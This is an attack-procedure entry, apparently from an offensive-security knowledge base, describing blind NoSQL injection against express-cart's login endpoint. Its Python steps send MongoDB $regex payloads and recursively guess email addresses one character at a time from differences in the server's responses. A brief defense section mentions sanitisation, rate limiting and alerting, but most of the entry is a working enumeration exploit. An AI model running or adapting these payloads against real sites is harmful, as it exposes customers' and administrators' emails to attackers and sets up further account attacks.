---
tags:
  - nosql-injection
  - regex-injection
  - blind-enumeration
type: procedure
tools:
  - '[[tools/Python]]'
  - '[[tools/requests-Library]]'
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:28:51.979Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 67c9f91c-7ce8-4728-8f1d-1c168cc0eef8
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Craft-NoSQL-Injection-Payloads-for-Email-Enumeration

## Summary

This procedure details the creation of MongoDB $regex payloads to perform blind character enumeration on email fields in the express-cart login endpoints, allowing attackers to guess emails one character at a time without direct output.

## Description

Exploiting the lack of sanitization, payloads are JSON objects sent via POST to /login, using $regex to match prefixes or positions in email strings (e.g., `{"$regex": "^a"}` for starts with 'a'). Responses differ based on match (e.g., invalid login error vs. no match), enabling blind inference. This targets the email field in customer/admin collections. Prerequisites: Confirmed injection point and character set (a-z, 0-9, @, ., etc.). The process is recursive, building strings like domain first, then username.

## Requirements

1. HTTP access to the login endpoint
2. Python environment with requests library
3. Defined character set for enumeration (alphanumeric + symbols)

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to strings and escape special characters
- Implement rate limiting on login attempts to thwart enumeration
- Log and alert on payloads containing MongoDB operators like $regex

## Objectives

1. Develop payloads that reliably detect character matches via response differences
2. Iterate over positions to build full emails
3. Test on both customer and admin endpoints

## Instructions

### Step 1: Define Character Set and Positions

**Context**: Prepare the alphabet for guessing and email structure (e.g., local@domain.tld).

No command; define in script: chars = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'

> Expected: List of possible characters for recursive tries.

### Step 2: Craft Basic Prefix Match Payload

**Context**: Test for emails starting with a specific character.

Use [[tools/requests-Library]]:

```python
import requests

url = 'http://target.com/login'
payload = {"loginEmail": {"$regex": "^a"}}
response = requests.post(url, json=payload)
# Analyze response: e.g., if 'Invalid email' != expected no-match
print("Match" if 'error' in response.text else "No match")
```

> Expected: Response indicating match (e.g., proceeds to password check) vs. no match.

### Step 3: Build Recursive Payload for Full String

**Context**: Extend to append characters positionally.

Modify payload for position n: `{"$regex": "^knownprefix[char]"}` and recurse on success.

```python
# Pseudo-code in script
def guess_next(prefix):
    for char in chars:
        test_payload = {"loginEmail": {"$regex": "^" + prefix + char}}
        # Send and check response
        if match:
            return guess_next(prefix + char)
    return prefix
```

> Expected: Built string like 'a@l' step-by-step.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Python]]
- [[tools/requests-Library]]

## Tags

- nosql-injection
- regex-injection
- blind-enumeration
